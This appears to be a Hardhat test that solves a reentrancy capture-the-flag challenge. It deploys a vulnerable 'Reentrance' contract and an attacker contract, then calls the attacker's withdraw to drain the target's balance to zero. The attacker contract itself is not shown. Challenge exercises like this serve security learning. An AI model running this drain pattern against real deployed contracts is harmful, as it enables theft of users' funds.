import { provider } from "starknet";
import { loadFixture, ethers, expect } from "./setup";

describe("Reentrance", function() {

    async function deploy() {
        const signer = (await ethers.getSigners())[0];

        const factory = await ethers.getContractFactory("Reentrance");
        const contract = await factory.deploy();

        const balance = await ethers.provider.getBalance(contract.target);
        
        const attackerFactory = await ethers.getContractFactory("ReentranceAttacker");
        const attacker = await attackerFactory.deploy(contract.target, balance);

        await contract.waitForDeployment();

        return { contract, attacker, signer, balance }
    }

    it("Solve the challenge", async function() {
        let tx;
        const { contract, attacker, signer, balance } = await loadFixture(deploy);

        expect(contract.target).to.be.properAddress;
        
        const attackerAddress = await attacker.getAddress();
        tx = await contract.connect(signer).donate(attackerAddress, { value: balance });
        await tx.wait();

        tx = await attacker.connect(signer).withdraw();
        await tx.wait();

        const resultBalance = await ethers.provider.getBalance(contract.target);
        expect(resultBalance).to.be.equal(0);
    });

});